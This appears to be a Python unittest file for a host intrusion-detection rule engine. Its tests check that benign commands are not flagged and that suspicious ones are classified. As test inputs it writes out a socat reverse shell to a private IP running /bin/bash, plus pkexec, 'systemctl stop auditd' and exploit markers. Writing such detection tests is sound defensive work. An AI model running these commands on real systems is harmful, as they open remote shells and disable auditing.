from support import EvidenceDirectory
import unittest
from pathlib import Path

import yaml

from satsuma.smart_rules import SmartRuleEngine


class SmartRuleEngineTests(unittest.TestCase):
    def setUp(self):
        self.engine = SmartRuleEngine()

    def event(self, cmd, ident='1'):
        return {
            'id': ident,
            'source': 'sys_proc',
            'action': 'new_process',
            'kind': 'process',
            'category': 'host',
            'cmd': cmd,
            'uid': 1000,
            'ppid': 200,
            'parent_cmd': 'bash',
        }

    def test_full_rule_set_loads_strictly(self):
        stats = self.engine.stats()
        self.assertEqual(stats['total_rules'], 281)  # RAM-106/107 retired; 2.2.54: +50 coverage_gaps rules
        self.assertEqual(stats['invalid_files'], 0, stats['load_errors'])
        self.assertEqual(stats['classifications'].get('confirmed', 0), 0)

    def test_plain_process_is_not_tor_alarm(self):
        self.assertEqual(self.engine.match(self.event('bash')), [])
        self.assertEqual(self.engine.match(self.event('python3 -c print(1)')), [])
        self.assertEqual(self.engine.match(self.event('dbus-monitor --system')), [])

    def test_audit_worker_process_is_not_tor_alarm(self):
        cmd = '/usr/bin/python3 -I /opt/satsuma-core/main.py --audit-worker'
        findings = self.engine.match(self.event(cmd, 'audit-worker'))
        self.assertNotIn('SATSUMA-C2-006', {f['rule_id'] for f in findings})

    def test_word_boundary_top_does_not_match_stop(self):
        findings = self.engine.match(self.event('systemctl stop auditd'))
        ids = {f['rule_id'] for f in findings}
        self.assertNotIn('SATSUMA-DISC-004', ids)

    def test_normal_admin_indicators_are_deduplicated(self):
        findings = self.engine.match(self.event('sudo -i'))
        root_shell = [f for f in findings if f.get('dedup_group') == 'root_shell_admin']
        self.assertEqual(len(root_shell), 1)
        self.assertEqual(root_shell[0]['classification'], 'indicator')
        self.assertEqual(root_shell[0]['actions'], ['log_only'])

        findings = self.engine.match(self.event('modprobe iwlwifi', '2'))
        kernel = [f for f in findings if f.get('dedup_group') == 'kernel_module_admin']
        self.assertEqual(len(kernel), 1)
        self.assertEqual(kernel[0]['classification'], 'indicator')

    def test_rule_actions_are_canonical_strings(self):
        findings = self.engine.match(self.event('pkexec --user root /tmp/x', '3'))
        self.assertTrue(findings)
        for finding in findings:
            self.assertTrue(all(isinstance(a, str) for a in finding['actions']))

    def test_unknown_matcher_invalidates_rule(self):
        with EvidenceDirectory() as td:
            path = Path(td) / 'bad.yaml'
            path.write_text(yaml.safe_dump([{
                'id': 'BAD-1',
                'severity': 'high',
                'base_match': {'source': 'sys_proc', 'cmd_regx': 'tor'},
            }]))
            engine = SmartRuleEngine(td)
            self.assertEqual(engine.stats()['total_rules'], 0)
            self.assertEqual(engine.stats()['invalid_files'], 1)

    def test_generic_kernel_feature_names_are_not_likely_exploits(self):
        samples = [
            'demo --feature nf_tables',
            'demo --feature io_uring',
            'perf_event_open test',
            'mount -t overlay overlayfs /mnt',
            'tc filter add dev eth0 pedit munge',
        ]
        for index, command in enumerate(samples, 20):
            findings = self.engine.match(self.event(command, str(index)))
            kernel_likely = [
                f for f in findings
                if f.get('rule_id', '').startswith('SATSUMA-KERNEL-')
                and f.get('classification') == 'likely'
            ]
            self.assertEqual(kernel_likely, [], command)

    def test_explicit_cve_marker_can_be_likely(self):
        findings = self.engine.match(self.event('CVE-2024-1086', '30'))
        by_id = {f['rule_id']: f for f in findings}
        self.assertEqual(by_id['SATSUMA-KERNEL-003']['classification'], 'likely')

    def test_security_tool_presence_is_indicator_not_attack(self):
        findings = self.engine.match(self.event('msfconsole', '31'))
        by_id = {f['rule_id']: f for f in findings}
        self.assertEqual(by_id['SATSUMA-EXEC-015']['classification'], 'indicator')
        self.assertEqual(by_id['SATSUMA-EXEC-015']['actions'], ['log_only'])

    def test_reverse_shell_patterns_stay_high_signal(self):
        benign = self.engine.match(self.event('socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80', '32'))
        self.assertNotIn('SATSUMA-EXEC-006', {f['rule_id'] for f in benign})
        malicious = self.engine.match(self.event('socat TCP:10.0.0.5:4444 EXEC:/bin/bash', '33'))
        by_id = {f['rule_id']: f for f in malicious}
        self.assertEqual(by_id['SATSUMA-EXEC-006']['classification'], 'indicator')


if __name__ == '__main__':
    unittest.main()
